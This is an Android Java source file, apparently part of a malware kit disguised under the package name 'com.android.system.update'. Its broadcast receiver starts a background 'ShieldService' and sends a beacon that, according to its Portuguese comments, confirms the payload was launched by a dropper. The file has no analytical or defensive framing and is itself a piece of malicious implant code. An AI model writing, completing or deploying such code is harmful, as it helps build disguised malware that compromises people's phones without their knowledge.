package com.android.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class StartReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && "com.android.system.update.START".equals(intent.getAction())) {
            // Inicia o servico principal em foreground
            try {
                context.startService(new Intent(context, ShieldService.class));
            } catch (Exception e) { }

            // Envia beacon confirmando que o payload foi iniciado pelo dropper
            BeaconSender.send(context, "started_by_dropper");
        }
    }
}
